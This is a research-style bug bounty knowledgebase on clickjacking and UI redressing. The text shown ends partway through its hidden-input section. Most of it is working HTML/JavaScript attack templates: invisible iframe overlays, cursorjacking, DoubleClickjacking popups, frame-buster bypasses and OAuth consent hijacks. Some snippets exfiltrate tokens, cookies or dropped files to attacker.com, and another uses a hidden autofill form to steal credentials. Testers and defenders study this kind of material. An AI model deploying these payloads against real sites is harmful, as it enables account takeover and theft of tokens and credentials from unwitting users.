# Clickjacking & UI Redressing - Advanced Bug Bounty Knowledgebase

> **Version**: 2025-06-23 | **Classification**: Research-Grade | **Scope**: Advanced Bug Bounty & Black-Box Testing
> 
> This knowledgebase consolidates data from PortSwigger Web Security Academy, OWASP, PayloadsAllTheThings, HackTricks, Microsoft Research, and cutting-edge 2024-2025 research.

---

## Table of Contents

1. [Basics](#1-basics)
2. [Clickjacking Theory](#2-clickjacking-theory)
3. [UI Redressing Techniques](#3-ui-redressing-techniques)
4. [iframe Overlay Attacks](#4-iframe-overlay-attacks)
5. [Cursorjacking Techniques](#5-cursorjacking-techniques)
6. [Drag-and-Drop Abuse](#6-drag-and-drop-abuse)
7. [Double Clickjacking](#7-double-clickjacking)
8. [Frame-Buster Bypasses](#8-frame-buster-bypasses)
9. [CSP frame-ancestors Bypasses](#9-csp-frame-ancestors-bypasses)
10. [X-Frame-Options Weaknesses](#10-x-frame-options-weaknesses)
11. [postMessage + Clickjacking Chains](#11-postmessage--clickjacking-chains)
12. [OAuth Clickjacking Attacks](#12-oauth-clickjacking-attacks)
13. [Hidden Input Exploitation](#13-hidden-input-exploitation)
14. [Transparent Overlay Techniques](#14-transparent-overlay-techniques)
15. [DOM XSS + Clickjacking Chains](#15-dom-xss--clickjacking-chains)
16. [CSRF + Clickjacking Chains](#16-csrf--clickjacking-chains)
17. [Token Theft Techniques](#17-token-theft-techniques)
18. [Browser Quirks](#18-browser-quirks)
19. [Gadget Chains](#19-gadget-chains)
20. [Real World Case Studies](#20-real-world-case-studies)
21. [Fuzzing Payloads](#21-fuzzing-payloads)
22. [Automation Workflows](#22-automation-workflows)
23. [Recon Methodology](#23-recon-methodology)
24. [Nuclei Templates](#24-nuclei-templates)
25. [Tools and Scanners](#25-tools-and-scanners)
26. [Advanced Research](#26-advanced-research)
27. [Bug Bounty Writeups](#27-bug-bounty-writeups)
28. [Payload Collections](#28-payload-collections)
29. [WAF Bypasses](#29-waf-bypasses)
30. [Detection Techniques](#30-detection-techniques)
31. [References](#31-references)

---

## 1. Basics

### 1.1 What is Clickjacking?

Clickjacking (UI redressing) is an interface-based attack where a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content.

**Key distinction from CSRF**: Clickjacking requires the user to perform an action such as a button click, whereas CSRF depends upon forging an entire request without the user's knowledge or input. CSRF tokens placed into requests are passed to the server as part of a normally behaved session - the difference is that the process occurs within a hidden iframe.

### 1.2 Attack Prerequisites

1. Target page must be frameable (no X-Frame-Options / CSP frame-ancestors)
2. Target action must be triggerable with a single click (or chain of clicks)
3. User must be authenticated (for sensitive actions) - SameSite cookies can block this
4. Attacker controls a domain to host the decoy page

### 1.3 Basic Attack Structure

```html
<head>
    <style>
        #target_website {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;
            z-index: 2;
        }
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="decoy_website">
        ...decoy web content here...
    </div>
    <iframe id="target_website" src="https://vulnerable-website.com">
    </iframe>
</body>
```

### 1.4 Core CSS Properties Used

| Property | Purpose | Attack Value |
|----------|---------|--------------|
| `opacity` | Make iframe transparent | `0.00001` (below browser detection threshold) |
| `z-index` | Layer stacking order | Higher = on top |
| `position` | Precise positioning | `absolute` or `relative` |
| `top`/`left` | Pixel-perfect alignment | Calibrated per target |
| `pointer-events` | Click-through behavior | `none` on overlay, `auto` on target |

### 1.5 Browser Transparency Detection Thresholds

- **Chrome 76+**: Applies threshold-based iframe transparency detection
- **Firefox**: Does NOT apply transparency detection (more permissive)
- **Safari**: Similar to Chrome but thresholds may vary
- **Edge**: Follows Chromium behavior

> **Research Note**: Chrome's detection triggers at very low opacity values. Using `opacity: 0.0001` typically bypasses detection while remaining invisible to users. Some researchers use `opacity: 0.00001` for extra safety margin.

---

## 2. Clickjacking Theory

### 2.1 The Three Integrity Compromises

Microsoft Research classifies clickjacking attacks according to three integrity compromises:

1. **Display Integrity**: The guarantee that users can fully see and recognize the target element before an input action
2. **Pointer Integrity**: The guarantee that users can rely on cursor feedback to select locations for their input events
3. **Temporal Integrity**: The guarantee that users have enough time to comprehend where they are clicking

### 2.2 Attack Classification Matrix

| Attack Type | Integrity Compromised | Mechanism | Defense Bypassed |
|-------------|----------------------|-----------|----------------|
| Basic Overlay | Display | Transparent iframe | None |
| Cursorjacking | Pointer | Fake cursor offset | None |
| Double-Click | Temporal | Rapid context switch | X-Frame-Options, frame-ancestors |
| Drag-and-Drop | Display + Pointer | Text/file drag into iframe | None |
| Rapid Replacement | Temporal | Millisecond-level swap | None |
| PostMessage Chain | Temporal | Cross-window comms | Frame restrictions |

### 2.3 SameSite Cookie Impact

```
SameSite=Strict    -> Cookies blocked in ALL cross-site contexts (iframes, links, POST)
SameSite=Lax     -> Cookies blocked in cross-site iframes and POST requests
SameSite=None    -> Cookies sent in all contexts (requires Secure attribute)
```

**Attack Implication**: If target site uses `SameSite=Strict` or `Lax` on session cookies, clickjacking attacks requiring authentication will fail because cookies won't be sent in the iframe.

> **Bug Bounty Tip**: Always check SameSite cookie policy first. If Strict/Lax, look for:
> - Actions that don't require authentication (public endpoints)
> - Cookie tossing / jar overflow to downgrade SameSite
> - State-changing actions via GET parameters (bypasses Lax for top-level navigation)

---

## 3. UI Redressing Techniques

### 3.1 Complete Transparent Overlay

The most common technique - overlay a legitimate page over a malicious page using an invisible iframe.

```html
<!-- Complete transparent overlay -->
<style>
    #overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0;
        z-index: 9999;
    }
</style>
<div id="overlay">
    <iframe src="https://target.com/sensitive-action" width="100%" height="100%">
</div>
<div id="decoy">
    <!-- Visible decoy content -->
    <button>Click here to win!</button>
</div>
```

### 3.2 Cropping / Partial Overlay

Overlay only selected controls from the target page onto the decoy page.

```html
<!-- Cropping attack - only overlay the button -->
<style>
    #cropped-frame {
        position: absolute;
        top: 350px;
        left: 80px;
        width: 120px;
        height: 40px;
        opacity: 0.0001;
        z-index: 2;
        overflow: hidden;
    }
</style>
<div id="decoy">
    <button style="position:absolute; top:350px; left:80px;">Click me</button>
</div>
<iframe id="cropped-frame" src="https://target.com/page-with-button">
</iframe>
```

### 3.3 Hidden 1x1 Pixel Overlay

Create a 1x1 pixel iframe positioned under the mouse cursor.

```html
<style>
    #pixel-frame {
        position: absolute;
        width: 1px;
        height: 1px;
        opacity: 0;
        z-index: 2;
    }
</style>
<script>
    document.addEventListener('mousemove', function(e) {
        document.getElementById('pixel-frame').style.left = e.clientX + 'px';
        document.getElementById('pixel-frame').style.top = e.clientY + 'px';
    });
</script>
<iframe id="pixel-frame" src="https://target.com/anywhere-click"></iframe>
```

### 3.4 Click Event Dropping (pointer-events)

Use `pointer-events: none` on the top layer so clicks pass through to the iframe below.

```html
<style>
    #top-layer {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;  /* Clicks pass through */
        z-index: 2;
    }
    #target-frame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
    }
</style>
<div id="top-layer">
    <!-- Visible decoy content - clicks pass through -->
    <img src="decoy-game.jpg" width="100%" height="100%">
</div>
<iframe id="target-frame" src="https://target.com"></iframe>
```

### 3.5 Rapid Content Replacement

Blur overlays cover target elements, removed for milliseconds to capture click.

```html
<style>
    #rapid-overlay {
        position: absolute;
        top: 300px;
        left: 50px;
        width: 200px;
        height: 50px;
        background: rgba(255,255,255,0.9);
        z-index: 3;
        transition: opacity 0.001s;
    }
</style>
<div id="rapid-overlay"></div>
<iframe src="https://target.com"></iframe>
<script>
    // Remove overlay right before anticipated click
    setTimeout(() => {
        document.getElementById('rapid-overlay').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('rapid-overlay').style.opacity = '1';
        }, 50);  // Restore after click window
    }, 5000);  // Time based on user behavior prediction
</script>
```

### 3.6 Scrolling-based UI Redressing

Partially scroll a legitimate dialog off-screen so only buttons are visible.

```html
<style>
    #scroll-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 400px;
        height: 100px;
        overflow: hidden;
        z-index: 2;
    }
    #scroll-container iframe {
        position: relative;
        top: -200px;  /* Scroll warning text off-screen */
        width: 100%;
        height: 300px;
        border: none;
    }
</style>
<div id="decoy">
    <p>Please confirm your age to continue:</p>
    <!-- Buttons from scrolled iframe align here -->
</div>
<div id="scroll-container">
    <iframe src="https://target.com/delete-account-confirm"></iframe>
</div>
```

---

## 4. iframe Overlay Attacks

### 4.1 Basic iframe Overlay

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0.0001;
            z-index: 2;
        }
        div {
            position: absolute;
            top: 470px;
            left: 60px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div>Click me</div>
    <iframe src="https://vulnerable.com/email?email=attacker@evil.com"></iframe>
</body>
</html>
```

### 4.2 Multistep iframe Overlay

For actions requiring multiple clicks (e.g., delete account with confirmation).

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 60px;
        z-index: 1;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

### 4.3 Prefilled Form Input via iframe

When target permits prepopulation of form inputs using GET parameters.

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://target.com/my-account?email=attacker@evil.com"></iframe>
```

> **Research Note**: The GET parameter prefill technique works when:
> 1. Form fields have `name` attributes matching URL parameters
> 2. Server-side code populates fields from `$_GET` / `request.GET`
> 3. No CSRF token is required for the specific action (or token is bypassable)

### 4.4 Invisible iframe (0x0 dimensions)

```html
<iframe src="https://target.com" 
        style="opacity: 0; height: 0; width: 0; border: none;">
</iframe>
```

### 4.5 iframe Sandbox Bypass for Frame Busters

```html
<!-- Neutralizes frame-busting scripts by disabling top-navigation -->
<iframe id="victim_website" 
        src="https://victim-website.com" 
        sandbox="allow-forms allow-scripts">
</iframe>
```

**Sandbox attribute values and their effects:**

| Value | Effect on Frame Buster |
|-------|----------------------|
| `allow-forms` | Permits form submission |
| `allow-scripts` | Permits script execution |
| `allow-same-origin` | Allows same-origin access |
| `allow-top-navigation` | **ENABLES** frame busting (do not use for attacks) |
| `allow-popups` | Permits popup windows |
| `allow-modals` | Permits modal dialogs |

> **Critical**: Omit `allow-top-navigation` to prevent `top.location = self.location` frame busters from working.

### 4.6 Double iframe Nesting

Nesting iframes can confuse frame-busting logic that checks `parent.location`.

```html
<!-- Attacker top frame -->
<iframe src="attacker2.html">

<!-- Inside attacker2.html -->
<iframe src="https://victim-site.com/protected-page"></iframe>
```

**Why it works**: Frame buster code using `parent.location` fails because accessing `parent.location` across the double-frame boundary triggers the **descendant frame navigation policy** security violation, disabling the counter-action navigation.

---

## 5. Cursorjacking Techniques

### 5.1 Classic Cursorjacking (Historical)

Original cursorjacking relied on Flash and Firefox vulnerabilities that have been patched. The technique changed the cursor position the user perceived to another position.

```html
<!-- Historical cursorjacking (patched) -->
<style>
    body {
        cursor: none;  /* Hide real cursor */
    }
    #fake-cursor {
        position: absolute;
        width: 20px;
        height: 20px;
        background: url('cursor.png');
        pointer-events: none;
        z-index: 9999;
    }
</style>
<div id="fake-cursor"></div>
<script>
    document.addEventListener('mousemove', function(e) {
        // Fake cursor offset by 50px
        document.getElementById('fake-cursor').style.left = (e.clientX + 50) + 'px';
        document.getElementById('fake-cursor').style.top = (e.clientY + 50) + 'px';
    });
</script>
```

### 5.2 Modern Cursor Manipulation

While original cursorjacking is patched, new techniques emerge:

```html
<!-- Modern cursor offset using CSS transform -->
<style>
    #target-area {
        transform: translate(100px, 50px);  /* Visual offset */
    }
    iframe {
        position: absolute;
        opacity: 0.0001;
    }
</style>
```

### 5.3 Phantom Mouse Cursors

Simulate an additional mouse cursor fixed distance from real pointer.

```html
<style>
    #phantom-cursor {
        position: fixed;
        width: 20px;
        height: 20px;
        background: url('fake-cursor.png');
        pointer-events: none;
        z-index: 9999;
    }
</style>
<div id="phantom-cursor"></div>
<script>
    const offsetX = 100, offsetY = 50;
    document.addEventListener('mousemove', function(e) {
        const phantom = document.getElementById('phantom-cursor');
        phantom.style.left = (e.clientX + offsetX) + 'px';
        phantom.style.top = (e.clientY + offsetY) + 'px';
    });
</script>
```

### 5.4 Cursor Hiding with Custom Cursor

```css
/* Hide real cursor on specific elements */
.sensitive-area {
    cursor: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='), auto;
}
```

> **Note**: The base64-encoded image above is a 1x1 transparent PNG - effectively hiding the cursor.

---

## 6. Drag-and-Drop Abuse

### 6.1 Theory

Drag-and-Drop clickjacking exploits the HTML5 Drag and Drop API. Rather than getting victims to click specific locations, attackers get users to drag objects or text from visible windows into an invisible iframe.

**Affected browsers**: Internet Explorer, Firefox, Chrome, Safari all support drag-and-drop into iframes.

### 6.2 File Theft via Drag-and-Drop

```html
<html>
<head>
<style>
    #drop-zone {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.0001;
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
    }
</style>
</head>
<body>
    <div id="decoy">
        <h1>Organize your files!</h1>
        <p>Drag your sensitive documents here to sort them</p>
    </div>
    <iframe id="drop-zone" src="https://attacker.com/file-receiver"></iframe>
    <script>
        // The iframe receives dropped files and exfiltrates them
    </script>
</body>
</html>
```

### 6.3 Text Injection via Drag-and-Drop

Firefox allows text to be dragged into frames (though not out of them). This enables:
- Exploiting self-XSS vulnerabilities requiring user input
- Adding new admin users if victim has privileges
- Submitting arbitrary form data across multiple fields

```html
<!-- Drag-and-Drop + Click payload for form filling -->
<html>
<head>
<style>
    #payload {
        position: absolute;
        top: 20px;
    }
    iframe {
        width: 1000px;
        height: 675px;
        border: none;
    }
    .xss {
        position: fixed;
        background: #F00;
    }
</style>
</head>
<body>
    <div style="height: 26px; width: 250px; left: 41.5%; top: 340px;" class="xss">.</div>
    <div style="height: 26px; width: 50px; left: 32%; top: 327px; background: #F8F;" class="xss">
        1. Click and press delete button
    </div>
    <div style="height: 30px; width: 50px; left: 60%; bottom: 40px; background: #F5F;" class="xss">
        3. Click me
    </div>
    <iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" 
            style="opacity:0.3" 
            src="https://target.com/panel/administration/profile/">
    </iframe>
    <div id="payload" draggable="true" 
         ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')">
        <h3>2. DRAG ME TO THE RED BOX</h3>
    </div>
</body>
</html>
```

### 6.4 Cookiejacking via Drag-and-Drop

The user is led to interact with a UI element via drag and drop to provide the attacker with cookies stored on their browser.

```html
<!-- Cookiejacking drag setup -->
<div draggable="true" 
     ondragstart="event.dataTransfer.setData('text/plain', document.cookie)">
    Drag this to verify your account
</div>
<iframe src="https://attacker.com/cookie-receiver" style="opacity:0"></iframe>
```

### 6.5 Java-Enhanced Drag-and-Drop

Java's drag and drop API is more powerful than the browser's, allowing single-click drag initiation.

```html
<!-- Java applet for enhanced drag-and-drop -->
<applet code="DragApplet.class" width="1" height="1">
    <param name="target" value="https://attacker.com/receiver">
</applet>
```

> **Note**: Java applets are largely deprecated in modern browsers. This technique is primarily of historical interest but demonstrates the evolution of drag-and-drop attacks.

---

## 7. Double Clickjacking

### 7.1 Theory

Double Clickjacking (discovered by Paulos Yibelo, 2024-2025) exploits the timing gap between the first and second click of a double-click sequence. It **bypasses ALL traditional clickjacking protections** including X-Frame-Options, CSP frame-ancestors, and SameSite cookies because it does not use iframes.

**Mechanism**:
1. Attacker shows a decoy button (e.g., Claim reward, Solve CAPTCHA)
2. User clicks once (first click)
3. JavaScript immediately replaces the underlying page/window with the target authorization page
4. User's second click lands on the real Allow / Confirm button
5. Action is executed with full authentication (no iframe = cookies sent normally)

### 7.2 Popup-Based DoubleClickjacking (No iframes)

```html
<script>
let w;
window.onclick = () => {
    if (!w) w = window.open('/shim', 'pj', 'width=360,height=240');
    window.onmousemove = e => { 
        try { w.moveTo(e.screenX, e.screenY); } catch {} 
    };
    // When ready, refocus the already-loaded popup
    window.open('', 'pj');
};
</script>
```

**How it works**:
1. Attacker opens a small popup (`window.open`) to an attacker-controlled shim page
2. Tracks mouse movement and repositions popup under cursor using `moveTo()`
3. While popup is same-origin, `moveTo()` works freely
4. Once aligned, popup is redirected to target origin
5. Re-open popup with same window name to bring it to foreground
6. User's next click lands on target button

### 7.3 Window.opener DoubleClickjacking

```html
<script>
// Attacker page
function exploit() {
    // Open popup with double-click prompt
    const popup = window.open('about:blank', 'auth', 'width=400,height=300');
    
    // Write decoy content to popup
    popup.document.write(`
        <h1>Verify you are human</h1>
        <p>Double-click the button below</p>
        <button id="btn">Verify</button>
        <script>
            document.getElementById('btn').addEventListener('mousedown', function() {
                // First click: change parent to target
                window.opener.location = 'https://target.com/oauth/authorize?client_id=ATTACKER';
                // Close popup so second click lands on parent
                window.close();
            });
        <\/script>
    `);
}
</script>
<button onclick="exploit()">Start Verification</button>
```

### 7.4 Rapid Context Switch DoubleClickjacking

```html
<script>
document.addEventListener('mousedown', function(e) {
    // First half of double-click detected
    // Immediately swap the target button under cursor
    document.getElementById('decoy').style.display = 'none';
    document.getElementById('real-target').style.display = 'block';
    
    // The second click (mouseup/click) will land on the real target
});
</script>
```

### 7.5 Mitigations Against DoubleClickjacking

```javascript
// Defense: Require gesture delay before button activation
document.getElementById('sensitive-button').addEventListener('click', function(e) {
    if (!this.dataset.activated) {
        e.preventDefault();
        this.dataset.activated = 'true';
        this.style.opacity = '0.5';
        setTimeout(() => {
            this.style.opacity = '1';
        }, 500);  // 500ms delay
    }
});
```

### 7.6 Affected Platforms (2025 Status)

| Platform | Status | Impact |
|----------|--------|--------|
| Shopify | Demonstrated | OAuth authorization |
| Slack | Demonstrated | OAuth / permissions |
| Salesforce | Demonstrated | Internal actions |
| Spotify | Demonstrated | Account linking |
| 1Password | Vulnerable | Credential autofill |
| Bitwarden | Vulnerable | Credential autofill |
| LastPass | Vulnerable | Credential autofill |
| iCloud Passwords | Vulnerable | Credential autofill |
| Dashlane | Patched | - |
| Keeper | Patched | - |
| NordPass | Patched | - |
| ProtonPass | Patched | - |
| RoboForm | Patched | - |

---

## 8. Frame-Buster Bypasses

### 8.1 HTML5 Sandbox Attribute

```html
<!-- Bypass: Disable top-navigation to neutralize frame buster -->
<iframe src="https://victim-website.com" 
        sandbox="allow-forms allow-scripts">
</iframe>
```

### 8.2 Double Framing

```html
<!-- Attacker top frame -->
<iframe src="attacker2.html"></iframe>

<!-- Inside attacker2.html -->
<iframe src="https://victim-website.com"></iframe>
```

**Victim frame buster code that fails:**
```javascript
if (top.location != self.location) {
    parent.location = self.location;  // Security violation in double frame!
}
```

### 8.3 onBeforeUnload Event

```html
<!-- Attacker page -->
<script>
    window.onbeforeunload = function() {
        return "Do you want to leave fictitious.site?";
    };
</script>
<iframe src="https://target-site.com"></iframe>
```

**Why it works**: When frame buster tries `top.location = self.location`, the `onbeforeunload` handler fires. The user sees a confirmation dialog and likely cancels, defeating the frame bust.

### 8.4 No-Content Flushing (204 Response)

```php
<!-- 204.php -->
<?php
    header("HTTP/1.1 204 No Content");
?>
```

```html
<!-- Attacker page -->
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(function() {
        if (prevent_bust > 0) {
            prevent_bust -= 2;
            window.top.location = "http://attacker.site/204.php";
        }
    }, 1);
</script>
<iframe src="https://target-site.com"></iframe>
```

**Mechanism**: Navigating to a 204 No Content site is effectively a NOP but flushes the request pipeline, canceling the original navigation request.

### 8.5 XSS Filter Bypass (IE8)

```html
<!-- Attacker induces false positive in IE8 XSS filter -->
<iframe src="http://target-site/?param=<script>if">
```

**Why it works**: IE8 XSS filter disables all inline scripts when it detects a possible XSS attack. This includes frame-busting scripts.

### 8.6 Chrome XSSAuditor Bypass

```html
<!-- Attacker targets specific script snippet -->
<iframe src="http://target-site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
```

**Why it works**: Chrome XSSAuditor can deactivate a specific script by passing its code in a request parameter, leaving other scripts intact but neutralizing the frame buster.

### 8.7 Restricted Zones

**Internet Explorer:**
```html
<iframe src="http://target-site" security="restricted"></iframe>
```

**Firefox designMode:**
```javascript
// In parent page
document.designMode = "on";
```

### 8.8 JavaScript Disabling

Since frame busters rely on JavaScript, disabling JavaScript in the subframe context neutralizes them:

```html
<!-- Chrome/Safari sandbox -->
<iframe src="http://target-site" sandbox></iframe>

<!-- IE restricted -->
<iframe src="http://target-site" security="restricted"></iframe>
```

---

## 9. CSP frame-ancestors Bypasses

### 9.1 Understanding frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none';       # No framing allowed
Content-Security-Policy: frame-ancestors 'self';       # Same origin only
Content-Security-Policy: frame-ancestors https://example.com;  # Specific origin
```

### 9.2 X-Frame-Options Takes Priority (Legacy Browser Bug)

Section "Relation to X-Frame-Options" of the CSP Spec says:
> "If a resource is delivered with a policy that includes a directive named frame-ancestors and whose disposition is 'enforce', then the X-Frame-Options header MUST be ignored"

**But**: Older browser versions (Chrome 40, Firefox 35) ignored this requirement and followed X-Frame-Options instead.

**Attack**: If a site sends both headers and X-Frame-Options is weaker than frame-ancestors, legacy browsers may use the weaker protection.

### 9.3 Malformed CSP Syntax

When CSP encounters malformed syntax, it may ignore the directive entirely:

```
# Malformed - missing quotes around 'none'
Content-Security-Policy: frame-ancestors none;

# Malformed - invalid character
Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://myfriend.site.com extra-invalid-stuff;
```

### 9.4 Meta Tag CSP (Doesn't Work)

```html
<!-- THIS DOES NOT WORK for frame-ancestors -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
```

`frame-ancestors` MUST be configured as an HTTP Response Header, not in a `<meta>` tag.

### 9.5 Report-Only Mode

```
Content-Security-Policy-Report-Only: frame-ancestors 'none';
```

In report-only mode, the policy is NOT enforced. This is commonly left enabled by mistake during "transition periods."

### 9.6 Wildcard/Weak frame-ancestors

```
# Weak - allows any subdomain
Content-Security-Policy: frame-ancestors *.trusted.com;

# Weak - allows HTTP (not just HTTPS)
Content-Security-Policy: frame-ancestors http://partner.com;

# Weak - data: URLs
Content-Security-Policy: frame-ancestors 'self' data:;
```

### 9.7 JSONP + CSP Bypass Chain

If CSP whitelists a domain with JSONP endpoints:

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```

And `trusted-cdn.com` has a JSONP endpoint:
```
https://trusted-cdn.com/jsonp?callback=alert(1)
```

This can be combined with clickjacking to execute arbitrary code in the framed context.

### 9.8 frame-ancestors + X-Frame-Options Conflict

If both headers are present with conflicting values, browser behavior varies:

| Browser | Behavior |
|---------|----------|
| Chrome 40+ | frame-ancestors wins (per spec) |
| Firefox 35+ | frame-ancestors wins (per spec) |
| Safari | frame-ancestors wins |
| IE 11 | X-Frame-Options wins (legacy behavior) |
| Edge Legacy | X-Frame-Options wins |

---

## 10. X-Frame-Options Weaknesses

### 10.1 ALLOW-FROM Obsolescence

```
X-Frame-Options: ALLOW-FROM https://example.com
```

**Critical**: `ALLOW-FROM` is obsolete and no longer works in modern browsers (Chrome, Safari). If applied and the browser doesn't support it, the site has NO clickjacking defense.

### 10.2 Nested Frames with SAMEORIGIN

```
//friendlysite.invalid
    //framed.invalid/parent (X-Frame-Options: ALLOW-FROM http://friendlysite.invalid)
        //framed.invalid/child (X-Frame-Options: SAMEORIGIN)
```

The child frame does NOT load because ALLOW-FROM applies to the top-level browsing context, not the immediate parent.

### 10.3 Multiple Options Not Supported

```
# INVALID - browsers only honor ONE X-Frame-Options header
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://partner.com
```

Browsers only honor one X-Frame-Options header and one value.

### 10.4 Meta Tag X-Frame-Options (Doesn't Work)

```html
<!-- THIS DOES NOT WORK -->
<meta http-equiv="X-Frame-Options" content="deny">
```

Must be an HTTP response header.

### 10.5 Proxy Stripping

Web proxies are notorious for adding and stripping headers. If a proxy strips X-Frame-Options, the site loses framing protection.

### 10.6 Deprecated Status

X-Frame-Options has been obsoleted in favor of CSP `frame-ancestors`. However, it remains useful for:
- Legacy browser support
- Defense in depth
- Quick implementation without full CSP deployment

---

## 11. postMessage + Clickjacking Chains

### 11.1 Theory

postMessage enables cross-origin communication between windows/frames. When combined with clickjacking:
1. Attacker frames a page with insecure postMessage handler
2. postMessage handler performs dangerous actions without proper origin validation
3. Clickjacking triggers the postMessage flow
4. Attacker's page receives sensitive data or triggers actions

### 11.2 Token Exfiltration via postMessage

```html
<!-- Attacker page -->
<!DOCTYPE html>
<html>
<body>
    <iframe id="victim" src="https://victim-app.com"></iframe>
    <script>
        window.addEventListener('message', function(event) {
            // Capture sensitive tokens
            console.log('Stolen token:', event.data.token);
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(event.data)
            });
        });
    </script>
</body>
</html>
```

### 11.3 DOM XSS via postMessage

```javascript
// Vulnerable victim code
window.addEventListener('message', function(event) {
    // Dangerous: Direct injection into DOM
    document.getElementById('content').innerHTML = event.data;
});
```

```html
<!-- Attacker exploit -->
<iframe id="target" src="https://vulnerable-site.com"></iframe>
<script>
    var payload = '<img src=x onerror="alert(document.cookie)">';
    document.getElementById('target').contentWindow.postMessage(payload, '*');
</script>
```

### 11.4 postMessage + Clickjacking Gadget Chain

```html
<!-- Combined attack: Clickjacking triggers postMessage flow -->
<style>
    iframe {
        opacity: 0.0001;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
    }
</style>
<iframe id="target" src="https://victim.com/widget"></iframe>
<script>
    // After user clicks (triggered by clickjacking), send postMessage
    setTimeout(() => {
        document.getElementById('target').contentWindow.postMessage(
            { action: 'getToken' }, 
            '*'
        );
    }, 5000);
</script>
```

### 11.5 Predicting Math.random() in postMessage Bridges

**Leak PRNG outputs via window.name:**
```javascript
// If SDK auto-names plugin iframes with guid()
// Control top frame, iframe victim page, navigate plugin iframe to attacker origin
window.frames[0].frames[0].location = 'https://attacker.com';
// Read window.frames[0].frames[0].name to obtain raw Math.random() output
```

**Force more outputs:**
```javascript
// In FB SDK: firing init:post with {xfbml:1} forces XFBML.parse()
// Destroys/recreates plugin iframe, generating new names/callback IDs
FB.init({ xfbml: 1 });
```

---

## 12. OAuth Clickjacking Attacks

### 12.1 OAuth Authorization Code Flow Clickjacking

```html
<!-- Clickjacking OAuth consent screen -->
<style>
    iframe {
        position: relative;
        width: 600px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 420px;
        left: 450px;
        z-index: 1;
    }
</style>
<div>Click to continue</div>
<iframe src="https://accounts.google.com/o/oauth2/auth?client_id=ATTACKER_APP&redirect_uri=ATTACKER_URI&scope=email+profile&response_type=code"></iframe>
```

### 12.2 OAuth + DoubleClickjacking

The most dangerous combination - DoubleClickjacking bypasses all frame protections:

```javascript
// Attacker page
function oauthAttack() {
    const popup = window.open('about:blank', 'oauth', 'width=500,height=600');
    popup.document.write(`
        <h1>Complete verification</h1>
        <button id="verify">Double-click to verify</button>
        <script>
            let clicked = false;
            document.getElementById('verify').addEventListener('mousedown', function() {
                if (!clicked) {
                    clicked = true;
                    window.opener.location = 'https://accounts.google.com/o/oauth2/auth?client_id=ATTACKER&scope=https://mail.google.com/';
                    setTimeout(() => window.close(), 50);
                }
            });
        <\/script>
    `);
}
```

### 12.3 OAuth Account Hijacking via Hidden OAuth Dialogs

```html
<!-- Hidden OAuth dialog in iframe -->
<iframe src="https://provider.com/oauth/authorize?..." 
        style="opacity:0; position:absolute; top:0; left:0; width:1px; height:1px;">
</iframe>
```

### 12.4 OAuth State Parameter Bypass

If the OAuth state parameter is predictable or not validated:

```
# Attacker crafts OAuth URL with their own state
https://provider.com/oauth/authorize?client_id=LEGIT&redirect_uri=ATTACKER&state=ATTACKER_STATE
```

Combined with clickjacking, the attacker can intercept the authorization code.

---

## 13. Hidden Input Exploitation

### 13.1 Prefilled Hidden Inputs

When forms allow GET parameter prefill:

```html
<!-- Attacker prefills hidden fields -->
<iframe src="https://target.com/action?hidden_field=malicious_value&_token=csrf_token"></iframe>
```

### 13.2 XSS in Hidden Input Tags + Clickjacking

```html
<!-- Hidden input containing XSS payload, triggered by clickjacking form submit -->
<form action="https://target.com/update-profile" method="POST">
    <input type="hidden" name="bio" value="<script>alert(document.cookie)</script>">
    <input type="hidden" name="csrf_token" value="STOLEN_TOKEN">
</form>
```

### 13.3 DOM-Based Extension Clickjacking on Hidden Inputs

Marek Toth's research (2025) on password manager exploitation:

```javascript
// Attacker creates invisible form to trigger autofill
const form = document.createElement('form');
form.style.opacity = '0.001';
form.style.position = 'absolute';
form.style.top = '0';
form.innerHTML = `
    <input type="text" name="username" style="opacity:0">
    <input type="password" name="password" style="opacity:0">
`;
document.body.appendChild(form);

// Focus input to trigger password manager autofill
